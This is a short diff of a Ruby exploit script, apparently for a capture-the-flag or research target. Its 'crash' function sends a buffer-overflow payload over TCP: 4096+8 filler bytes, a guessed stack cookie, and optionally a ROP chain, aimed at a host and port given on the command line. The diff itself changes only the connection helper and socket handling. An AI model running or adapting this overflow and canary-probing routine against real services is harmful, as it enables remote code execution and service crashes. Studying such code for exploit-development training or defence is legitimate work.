@@ -63,15 +63,14 @@ def crash(cookie, cookie_test=true)
   data = ''
   5.times do
     payload = $payload
-    tcp_connect(ARGV[0],ARGV[1].to_i) do |s|
+    tcp_session(ARGV[0],ARGV[1].to_i) do |s|
       $count += 1
+
       payload << ["A"*(4096+8), cookie].join
       payload << ["C"*24, $ropchain].join if not cookie_test
 
       s.send(payload,0)
-
       data = s.recv(10)
-      s.close
     end
 
     return true if data.strip.length == 0
